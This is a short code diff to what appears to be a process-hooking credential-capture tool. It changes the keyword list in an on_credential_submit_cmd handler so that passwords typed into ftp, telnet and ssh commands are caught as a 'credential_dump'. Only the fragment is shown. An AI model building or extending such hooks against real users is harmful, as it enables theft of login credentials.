@@ -48,7 +48,7 @@ def hook(pid):
 
 
 def on_credential_submit_cmd(message, data):
-    targeted_keywords = ["-p", "pass", "password", "net"]
+    targeted_keywords = ["ftp", "telnet", "ssh", "pass", "-p"]
 
     credential_dump = message["payload"]
     if any(keyword for keyword in targeted_keywords if keyword in credential_dump):
